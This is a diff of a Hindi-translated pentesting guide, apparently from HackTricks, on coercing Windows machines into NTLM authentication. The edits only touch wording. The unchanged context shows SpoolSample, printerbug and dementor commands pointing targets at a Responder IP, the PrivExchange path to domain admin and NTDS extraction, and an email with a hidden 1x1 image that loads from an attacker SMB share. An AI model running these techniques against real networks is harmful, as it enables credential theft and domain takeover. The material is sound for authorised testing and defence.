@@ -4,7 +4,7 @@
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) एक **संग्रह** है **दूरस्थ प्रमाणीकरण ट्रिगर्स** का जो C# में MIDL कंपाइलर का उपयोग करके कोडित किया गया है ताकि 3rd पार्टी निर्भरताओं से बचा जा सके।
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) एक **संग्रह** है **दूरस्थ प्रमाणीकरण ट्रिगर्स** का, जो C# में MIDL कंपाइलर का उपयोग करके कोडित किया गया है ताकि 3rd पार्टी निर्भरताओं से बचा जा सके।
 
 ## Spooler Service Abuse
 
@@ -34,7 +34,7 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-या [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें यदि आप Linux पर हैं
+या [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें यदि आप Linux पर हैं।
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-`PrivExchange` हमला **Exchange Server के `PushSubscription` फीचर** में पाए गए दोष का परिणाम है। यह फीचर किसी भी डोमेन उपयोगकर्ता को जो एक मेलबॉक्स रखता है, को HTTP के माध्यम से किसी भी क्लाइंट-प्रदानित होस्ट के खिलाफ Exchange सर्वर को मजबूर करने की अनुमति देता है।
+`PrivExchange` हमला **Exchange Server `PushSubscription` फीचर** में पाए गए दोष का परिणाम है। यह फीचर किसी भी डोमेन उपयोगकर्ता को जो एक मेलबॉक्स रखता है, को HTTP के माध्यम से किसी भी क्लाइंट-प्रदानित होस्ट के खिलाफ Exchange सर्वर को मजबूर करने की अनुमति देता है।
 
-डिफ़ॉल्ट रूप से, **Exchange सेवा SYSTEM के रूप में चलती है** और इसे अत्यधिक विशेषाधिकार दिए जाते हैं (विशेष रूप से, इसके पास **डोमेन प्री-2019 संचयी अपडेट पर WriteDacl विशेषाधिकार** हैं)। इस दोष का उपयोग **LDAP को जानकारी भेजने और बाद में डोमेन NTDS डेटाबेस को निकालने** के लिए किया जा सकता है। उन मामलों में जहां LDAP को रिले करना संभव नहीं है, इस दोष का उपयोग डोमेन के भीतर अन्य होस्ट पर रिले और प्रमाणीकरण करने के लिए किया जा सकता है। इस हमले का सफलतापूर्वक शोषण करने से किसी भी प्रमाणित डोमेन उपयोगकर्ता खाते के साथ डोमेन व्यवस्थापक तक तात्कालिक पहुंच मिलती है।
+डिफ़ॉल्ट रूप से, **Exchange सेवा SYSTEM के रूप में चलती है** और इसे अत्यधिक विशेषाधिकार दिए जाते हैं (विशेष रूप से, इसके पास **डोमेन प्री-2019 संचयी अपडेट पर WriteDacl विशेषाधिकार** हैं)। इस दोष का उपयोग **LDAP पर जानकारी को रिले करने और बाद में डोमेन NTDS डेटाबेस को निकालने** के लिए किया जा सकता है। उन मामलों में जहां LDAP पर रिले करना संभव नहीं है, इस दोष का उपयोग डोमेन के भीतर अन्य होस्ट पर रिले और प्रमाणीकरण करने के लिए किया जा सकता है। इस हमले का सफलतापूर्वक शोषण करने से किसी भी प्रमाणित डोमेन उपयोगकर्ता खाते के साथ डोमेन एडमिन तक तात्कालिक पहुंच मिलती है।
 
 ## Windows के अंदर
 
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-यदि आप उस उपयोगकर्ता का **ईमेल पता** जानते हैं जो उस मशीन में लॉग इन करता है जिसे आप समझौता करना चाहते हैं, तो आप बस उसे एक **1x1 छवि** के साथ एक **ईमेल** भेज सकते हैं जैसे
+यदि आप उस उपयोगकर्ता का **ईमेल पता** जानते हैं जो उस मशीन में लॉग इन करता है जिसे आप समझौता करना चाहते हैं, तो आप बस उसे एक **1x1 छवि** के साथ **ईमेल** भेज सकते हैं जैसे
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -105,6 +105,6 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ## NTLMv1 को क्रैक करना
 
 यदि आप [NTLMv1 चुनौतियों को कैप्चर कर सकते हैं, तो यहां पढ़ें कि उन्हें कैसे क्रैक करें](../ntlm/index.html#ntlmv1-attack)।\
-&#xNAN;_&#x52; याद रखें कि NTLMv1 को क्रैक करने के लिए आपको Responder चुनौती को "1122334455667788" पर सेट करना होगा_
+_&#x52;emember कि NTLMv1 को क्रैक करने के लिए आपको Responder चुनौती को "1122334455667788" पर सेट करना होगा_
 
 {{#include ../../banners/hacktricks-training.md}}
